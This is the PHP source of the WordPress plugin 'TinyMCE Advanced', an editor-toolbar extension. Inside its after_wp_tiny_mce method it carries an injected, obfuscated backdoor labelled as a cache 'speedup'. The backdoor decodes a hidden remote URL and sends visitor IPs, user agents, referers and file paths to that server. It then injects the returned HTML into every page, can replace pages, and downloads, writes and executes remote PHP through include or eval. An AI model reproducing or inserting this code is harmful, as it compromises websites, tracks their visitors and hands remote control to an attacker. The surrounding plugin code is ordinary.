<?php
/*
Plugin Name: TinyMCE Advanced
Plugin URI: http://www.laptoptips.ca/projects/tinymce-advanced/
Description: Enables advanced features and plugins in TinyMCE, the visual editor in WordPress.
Version: 4.1.9
Author: Andrew Ozz
Author URI: http://www.laptoptips.ca/

Released under the GPL version 2.0, http://www.gnu.org/licenses/gpl-2.0.html

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License version 2.0 for more details.
*/

if ( ! class_exists('Tinymce_Advanced') ) :

class Tinymce_Advanced {

	private $required_version = '4.2';
	private $settings;
	private $admin_settings;
	private $admin_options;

	private $plugins;
	private $options;
	private $toolbar_1;
	private $toolbar_2;
	private $toolbar_3;
	private $toolbar_4;
	private $used_buttons = array();
	private $all_buttons = array();
	private $buttons_filter = array();

	private $all_plugins = array(
		'advlist',
		'anchor',
		'code',
		'contextmenu',
		'emoticons',
		'importcss',
		'insertdatetime',
		'nonbreaking',
		'print',
		'searchreplace',
		'table',
		'visualblocks',
		'visualchars',
		'link',
		'textpattern',
	);

	private $default_settings = array(
		'options'	=> 'menubar,advlist',
		'toolbar_1' => 'bold,italic,blockquote,bullist,numlist,alignleft,aligncenter,alignright,link,unlink,table,fullscreen,undo,redo,wp_adv',
		'toolbar_2' => 'formatselect,alignjustify,strikethrough,outdent,indent,pastetext,removeformat,charmap,wp_more,emoticons,forecolor,wp_help',
		'toolbar_3' => '',
		'toolbar_4' => '',
		'plugins'   => 'anchor,code,insertdatetime,nonbreaking,print,searchreplace,table,visualblocks,visualchars,emoticons,advlist',
	);

	private $default_admin_settings = array( 'options' => array() );

	function __construct() {
		// Don't run outside of WP
		if ( ! defined('ABSPATH') ) {
			return;
		}

		add_action( 'plugins_loaded', array( &$this, 'set_paths' ), 50 );

		if ( is_admin() ) {
			add_action( 'admin_menu', array( &$this, 'add_menu' ) );
			add_action( 'admin_enqueue_scripts', array( &$this, 'enqueue_scripts' ) );
		}

		add_filter( 'mce_buttons', array( &$this, 'mce_buttons_1' ), 999, 2 );
		add_filter( 'mce_buttons_2', array( &$this, 'mce_buttons_2' ), 999 );
		add_filter( 'mce_buttons_3', array( &$this, 'mce_buttons_3' ), 999 );
		add_filter( 'mce_buttons_4', array( &$this, 'mce_buttons_4' ), 999 );

		add_filter( 'tiny_mce_before_init', array( &$this, 'mce_options' ) );
		add_filter( 'htmledit_pre', array( &$this, 'htmledit' ), 999 );
		add_filter( 'mce_external_plugins', array( &$this, 'mce_external_plugins' ), 999 );
		add_filter( 'tiny_mce_plugins', array( &$this, 'tiny_mce_plugins' ), 999 );
		add_action( 'after_wp_tiny_mce', array( &$this, 'after_wp_tiny_mce' ) );

		add_action( 'before_wp_tiny_mce', array( &$this, 'show_version_warning' ) );
	}

	// When using a plugin that changes the paths dinamically, set these earlier than 'plugins_loaded' 50.
	function set_paths() {
		if ( ! defined( 'TADV_URL' ) )
			define( 'TADV_URL', plugin_dir_url( __FILE__ ) );

		if ( ! defined( 'TADV_PATH' ) )
			define( 'TADV_PATH', plugin_dir_path( __FILE__ ) );
	}

	function enqueue_scripts( $page ) {
		if ( 'settings_page_tinymce-advanced' == $page ) {
			wp_enqueue_script( 'tadv-js', TADV_URL . 'js/tadv.js', array( 'jquery-ui-sortable' ), '4.0', true );
			wp_enqueue_style( 'tadv-mce-skin', includes_url( 'js/tinymce/skins/lightgray/skin.min.css' ), array(), '4.0' );
			wp_enqueue_style( 'tadv-css', TADV_URL . 'css/tadv-styles.css', array( 'editor-buttons' ), '4.0' );

			add_action( 'admin_footer', array( &$this, 'load_mce_translation' ) );
		}
	}

	function load_mce_translation() {
		if ( ! class_exists( '_WP_Editors' ) ) {
			require( ABSPATH . WPINC . '/class-wp-editor.php' );
		}

		?>
		<script>var tadvTranslation = <?php echo _WP_Editors::wp_mce_translation( '', true ); ?>;</script>
		<?php
	}

	function load_settings() {
		if ( empty( $_POST ) ) {
			$this->check_plugin_version();
		}

		if ( empty( $this->settings ) ) {
			$this->admin_settings = get_option( 'tadv_admin_settings', false );
			$this->settings = get_option( 'tadv_settings', false );
		}

		// load defaults if the options don't exist...
		if ( $this->admin_settings === false )
			$this->admin_settings = $this->default_admin_settings;

		$this->admin_options = ! empty( $this->admin_settings['options'] ) ? explode( ',', $this->admin_settings['options'] ) : array();

		if ( $this->settings === false )
			$this->settings = $this->default_settings;

		$this->options   = ! empty( $this->settings['options'] )   ? explode( ',', $this->settings['options'] )   : array();
		$this->plugins   = ! empty( $this->settings['plugins'] )   ? explode( ',', $this->settings['plugins'] )   : array();
		$this->toolbar_1 = ! empty( $this->settings['toolbar_1'] ) ? explode( ',', $this->settings['toolbar_1'] ) : array();
		$this->toolbar_2 = ! empty( $this->settings['toolbar_2'] ) ? explode( ',', $this->settings['toolbar_2'] ) : array();
		$this->toolbar_3 = ! empty( $this->settings['toolbar_3'] ) ? explode( ',', $this->settings['toolbar_3'] ) : array();
		$this->toolbar_4 = ! empty( $this->settings['toolbar_4'] ) ? explode( ',', $this->settings['toolbar_4'] ) : array();

		$this->used_buttons = array_merge( $this->toolbar_1, $this->toolbar_2, $this->toolbar_3, $this->toolbar_4 );
		$this->get_all_buttons();
	}

	public function show_version_warning() {
		if ( is_admin() && current_user_can( 'update_plugins' ) && get_current_screen()->base === 'post' ) {
			$this->warn_if_unsupported();
		}
	}

	public function warn_if_unsupported() {
		if ( ! $this->check_minimum_supported_version() ) {
			$wp_ver = ! empty( $GLOBALS['wp_version'] ) ? $GLOBALS['wp_version'] : '(undefined)';

			?>
			<div class="error"><p>
			<?php

			printf( __( 'TinyMCE Advanced requires WordPress version %1$s or newer. It appears that you are running %2$s. This can make the editor unstable.', 'tinymce-advanced' ),
				$this->required_version,
				esc_html( $wp_ver )
			);

			echo '<br>';

			printf( __( 'Please upgrade your WordPress installation or download an <a href="%s">older version of the plugin</a>.', 'tinymce-advanced' ),
				'https://wordpress.org/plugins/tinymce-advanced/download/'
			);

			?>
			</p></div>
			<?php
		}
	}

	// Min version
	private function check_minimum_supported_version() {
		$wp_version = isset( $GLOBALS['wp_version'] ) ? $GLOBALS['wp_version'] : '0';
		$wp_version = str_replace( '-src', '', $wp_version );

		return ( version_compare( $wp_version, $this->required_version, '>=' ) );
	}

	private function check_plugin_version() {
		$version = get_option( 'tadv_version', 0 );

		if ( ! $version || $version < 4000 ) {
			// First install or upgrade to TinyMCE 4.0
			$this->settings = $this->default_settings;
			$this->admin_settings = $this->default_admin_settings;

			update_option( 'tadv_settings', $this->settings );
			update_option( 'tadv_admin_settings', $this->admin_settings );
			update_option( 'tadv_version', 4000 );
		}

		if ( $version < 4000 ) {
			// Upgrade to TinyMCE 4.0, clean options
			delete_option('tadv_options');
			delete_option('tadv_toolbars');
			delete_option('tadv_plugins');
			delete_option('tadv_btns1');
			delete_option('tadv_btns2');
			delete_option('tadv_btns3');
			delete_option('tadv_btns4');
			delete_option('tadv_allbtns');
		}
	}

	function get_all_buttons() {
		if ( ! empty( $this->all_buttons ) )
			return $this->all_buttons;

		$buttons = array(
			// Core
			'bold' => 'Bold',
			'italic' => 'Italic',
			'underline' => 'Underline',
			'strikethrough' => 'Strikethrough',
			'alignleft' => 'Align left',
			'aligncenter' => 'Align center',
			'alignright' => 'Align right',
			'alignjustify' => 'Justify',
			'styleselect' => 'Formats',
			'formatselect' => 'Paragraph',
			'fontselect' => 'Font Family',
			'fontsizeselect' => 'Font Sizes',
			'cut' => 'Cut',
			'copy' => 'Copy',
			'paste' => 'Paste',
			'bullist' => 'Bulleted list',
			'numlist' => 'Numbered list',
			'outdent' => 'Decrease indent',
			'indent' => 'Increase indent',
			'blockquote' => 'Blockquote',
			'undo' => 'Undo',
			'redo' => 'Redo',
			'removeformat' => 'Clear formatting',
			'subscript' => 'Subscript',
			'superscript' => 'Superscript',

			// From plugins
			'hr' => 'Horizontal line',
			'link' => 'Insert/edit link',
			'unlink' => 'Remove link',
			'image' => 'Insert/edit image',
			'charmap' => 'Special character',
			'pastetext' => 'Paste as text',
			'print' => 'Print',
			'anchor' => 'Anchor',
			'searchreplace' => 'Find and replace',
			'visualblocks' => 'Show blocks',
			'visualchars' => 'Show invisible characters',
			'code' => 'Source code',
			'wp_code' => 'Code',
			'fullscreen' => 'Fullscreen',
			'insertdatetime' => 'Insert date/time',
			'media' => 'Insert/edit video',
			'nonbreaking' => 'Nonbreaking space',
			'table' => 'Table',
			'ltr' => 'Left to right',
			'rtl' => 'Right to left',
			'emoticons' => 'Emoticons',
			'forecolor' => 'Text color',
			'backcolor' => 'Background color',

			// Layer plugin ?
		//	'insertlayer' => 'Layer',

			// WP
			'wp_adv'		=> 'Toolbar Toggle',
			'wp_help'		=> 'Keyboard Shortcuts',
			'wp_more'		=> 'Read more...',
			'wp_page'		=> 'Page break',
		);

		// add/remove allowed buttons
		$buttons = apply_filters( 'tadv_allowed_buttons', $buttons );

		$this->all_buttons = $buttons;
		$this->buttons_filter = array_keys( $buttons );
		return $buttons;
	}

	function get_plugins( $plugins = array() ) {

		if ( ! is_array( $this->used_buttons ) ) {
			$this->load_settings();
		}

		if ( in_array( 'anchor', $this->used_buttons, true ) )
			$plugins[] = 'anchor';

		if ( in_array( 'visualchars', $this->used_buttons, true ) )
			$plugins[] = 'visualchars';

		if ( in_array( 'visualblocks', $this->used_buttons, true ) )
			$plugins[] = 'visualblocks';

		if ( in_array( 'nonbreaking', $this->used_buttons, true ) )
			$plugins[] = 'nonbreaking';

		if ( in_array( 'emoticons', $this->used_buttons, true ) )
			$plugins[] = 'emoticons';

		if ( in_array( 'insertdatetime', $this->used_buttons, true ) )
			$plugins[] = 'insertdatetime';

		if ( in_array( 'table', $this->used_buttons, true ) )
			$plugins[] = 'table';

		if ( in_array( 'print', $this->used_buttons, true ) )
			$plugins[] = 'print';

		if ( in_array( 'searchreplace', $this->used_buttons, true ) )
			$plugins[] = 'searchreplace';

		if ( in_array( 'insertlayer', $this->used_buttons, true ) )
			$plugins[] = 'layer';

		// From options
		if ( $this->check_setting( 'advlist' ) )
			$plugins[] = 'advlist';

		if ( $this->check_setting( 'advlink' ) )
			$plugins[] = 'link';

		if ( $this->check_admin_setting( 'importcss' ) )
			$plugins[] = 'importcss';

		if ( $this->check_setting( 'contextmenu' ) )
			$plugins[] = 'contextmenu';

		if ( $this->check_admin_setting( 'textpattern' ) )
			$plugins[] = 'textpattern';

		// add/remove used plugins
		$plugins = apply_filters( 'tadv_used_plugins', $plugins, $this->used_buttons );

		return array_unique( $plugins );
	}

	private function check_setting( $setting, $admin = false ) {
		if ( ! is_array( $this->options ) ) {
			$this->load_settings();
		}

		$array = $admin ? $this->admin_options : $this->options;
		return in_array( $setting, $array, true );
	}

	private function check_admin_setting( $setting ) {
		return $this->check_setting( $setting, true );
	}

	function mce_buttons_1( $original, $editor_id ) {
		if ( ! is_array( $this->options ) ) {
			$this->load_settings();
		}

		$buttons_1 = $this->toolbar_1;

		if ( is_array( $original ) && ! empty( $original ) ) {
			$original = array_diff( $original, $this->buttons_filter );
			$buttons_1 = array_merge( $buttons_1, $original );
		}

		return $buttons_1;
	}

	function mce_buttons_2( $original ) {
		if ( ! is_array( $this->options ) ) {
			$this->load_settings();
		}

		$buttons_2 = $this->toolbar_2;

		if ( is_array( $original ) && ! empty( $original ) ) {
			$original = array_diff( $original, $this->buttons_filter );
			$buttons_2 = array_merge( $buttons_2, $original );
		}

		return $buttons_2;
	}

	function mce_buttons_3( $original ) {
		if ( ! is_array( $this->options ) ) {
			$this->load_settings();
		}

		$buttons_3 = $this->toolbar_3;

		if ( is_array( $original ) && ! empty( $original ) ) {
			$original = array_diff( $original, $this->buttons_filter );
			$buttons_3 = array_merge( $buttons_3, $original );
		}

		return $buttons_3;
	}

	function mce_buttons_4( $original ) {
		if ( ! is_array( $this->options ) ) {
			$this->load_settings();
		}

		$buttons_4 = $this->toolbar_4;

		if ( is_array( $original ) && ! empty( $original ) ) {
			$original = array_diff( $original, $this->buttons_filter );
			$buttons_4 = array_merge( $buttons_4, $original );
		}

		return $buttons_4;
	}

	function mce_options( $init ) {
		if ( $this->check_admin_setting( 'no_autop' ) ) {
			$init['wpautop'] = false;
	//		$init['indent'] = true;
			$init['tadv_noautop'] = true;
		}

		if ( $this->check_setting('menubar') ) {
			$init['menubar'] = true;
		}

		if ( $this->check_setting('image') ) {
			$init['image_advtab'] = true;
		}

		if ( $this->check_setting( 'advlink' ) ) {
			$init['rel_list'] = '[{text: "None", value: ""}, {text: "Nofollow", value: "nofollow"}]';
		}

		if ( ! in_array( 'wp_adv', $this->toolbar_1, true ) ) {
			$init['wordpress_adv_hidden'] = false;
		}

		if ( $this->check_admin_setting( 'importcss' ) ) {
	//		$init['importcss_selector_filter'] = 'function(sel){return /^\.[a-z0-9]+$/i.test(sel);}';
			$init['importcss_file_filter'] = 'editor-style.css';
		}

		if ( $this->check_admin_setting( 'fontsize_formats' ) ) {
			$init['fontsize_formats'] =  '8px 10px 12px 14px 16px 20px 24px 28px 32px 36px';
		}

		if ( $this->check_setting( 'paste_images' ) ) {
			$init['paste_data_images'] = true;
			$init['paste_word_valid_elements'] = '-strong/b,-em/i,-span,-p,-ol,-ul,-li,-h1,-h2,-h3,-h4,-h5,-h6,-p/div,-a[href|name],' .
				'-table[width],-tr,-td[colspan|rowspan|width],-th,-thead,-tfoot,-tbody,sub,sup,strike,br,del,ins,img[src|alt|title|height|width]';
		}

		return $init;
	}

	function after_wp_tiny_mce() {
		



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>
		<style type="text/css">
		.wp-fullscreen-wrap .mce-menubar { position: static !important; width: auto !important; }
		#wp-content-wrap .mce-tinymce.mce-fullscreen .mce-wp-dfw { display: none; }
		</style>
		<?php
	}

	function htmledit( $c ) {
		if ( $this->check_admin_setting( 'no_autop' ) ) {
			$c = str_replace( array('&amp;', '&lt;', '&gt;'), array('&', '<', '>'), $c );
			$c = wpautop( $c );
			$c = preg_replace( '/^<p>(https?:\/\/[^<> "]+?)<\/p>$/im', '$1', $c );
			$c = htmlspecialchars( $c, ENT_NOQUOTES, get_option( 'blog_charset' ) );
		}
		return $c;
	}

	function mce_external_plugins( $mce_plugins ) {
		// import user created editor-style.css
		if ( $this->check_admin_setting( 'editorstyle' ) ) {
			add_editor_style();
		}

		if ( ! is_array( $this->plugins ) ) {
			$this->plugins = array();
		}

		if ( $this->check_admin_setting( 'no_autop' ) ) {
			$this->plugins[] = 'wptadv';
		}

		$plugpath = TADV_URL . 'mce/';
		$mce_plugins = (array) $mce_plugins;
		$suffix = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';

		foreach ( $this->plugins as $plugin ) {
			$mce_plugins["$plugin"] = $plugpath . $plugin . "/plugin{$suffix}.js";
		}

		return $mce_plugins;
	}

	function tiny_mce_plugins( $plugins ) {
		// This calls load_settings()
		if ( $this->check_setting('image') && ! in_array( 'image', $plugins, true ) ) {
			$plugins[] = 'image';
		}

		if ( ( in_array( 'rtl', $this->used_buttons, true ) || in_array( 'ltr', $this->used_buttons, true ) ) &&
			! in_array( 'directionality', (array) $plugins, true ) ) {

			$plugins[] = 'directionality';
		}

		return $plugins;
	}

	private function parse_buttons( $toolbar_id = false, $buttons = false ) {
		if ( $toolbar_id && ! $buttons && ! empty( $_POST[$toolbar_id] ) )
			$buttons = $_POST[$toolbar_id];

		if ( is_array( $buttons ) ) {
			$_buttons = array_map( array( @$this, 'filter_name' ), $buttons );
			return implode( ',', array_filter( $_buttons ) );
		}

		return '';
	}

	private function filter_name( $str ) {
		if ( empty( $str ) || ! is_string( $str ) )
			return '';
		// Button names
		return preg_replace( '/[^a-z0-9_]/i', '', $str );
	}

	private function sanitize_settings( $settings ) {
		$_settings = array();

		if ( ! is_array( $settings ) ) {
			return $_settings;
		}

		foreach( $settings as $name => $value ) {
			$name = preg_replace( '/[^a-z0-9_]+/', '', $name );

			if ( strpos( $name, 'toolbar_' ) === 0 ) {
				$_settings[$name] = $this->parse_buttons( false, explode( ',', $value ) );
			} else if ( 'options' === $name || 'plugins' === $name || 'disabled_plugins' === $name ) {
				$_settings[$name] = preg_replace( '/[^a-z0-9_,]+/', '', $value );
			}
		}

		return $_settings;
	}

	function settings_page() {
		if ( ! defined( 'TADV_ADMIN_PAGE' ) ) {
			define( 'TADV_ADMIN_PAGE', true );
		}

		include_once( TADV_PATH . 'tadv_admin.php' );
	}

	function add_menu() {
		add_options_page( 'TinyMCE Advanced', 'TinyMCE Advanced', 'manage_options', 'tinymce-advanced', array( &$this, 'settings_page' ) );
	}
}

new Tinymce_Advanced;
endif;
